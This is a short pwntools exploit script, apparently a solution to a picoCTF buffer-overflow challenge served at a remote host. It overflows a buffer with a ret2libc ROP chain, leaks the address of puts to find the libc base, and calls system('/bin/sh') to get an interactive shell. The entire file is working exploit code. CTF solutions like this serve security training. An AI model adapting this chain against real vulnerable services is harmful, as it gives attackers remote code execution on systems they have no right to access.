from os import system
from pwn import *
from pwnlib.util.proc import tracer

# io = process("./vuln_patched")
io = remote("mercury.picoctf.net", 1774)

elf = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
rop = ROP(elf)

puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
do_stuff = elf.symbols["do_stuff"]
pop_rid = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]


offset = 136
payload = b"a" * offset
payload += p64(pop_rid)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(do_stuff)

io.recvuntil(b"WeLcOmE To mY EcHo sErVeR!\n")
io.sendline(payload)
print(io.recvline())

libc_puts = u64(io.recvline().rstrip().ljust(8, b"\x00"))
libc.address = libc_puts - libc.symbols["puts"]
print(f"libc base: {hex(libc.address)}")

payload2 = b"a" * offset
payload2 += p64(ret)
payload2 += p64(pop_rid)
payload2 += p64(next(libc.search(b"/bin/sh")))
payload2 += p64(libc.symbols["system"])

io.sendline(payload2)
io.interactive()
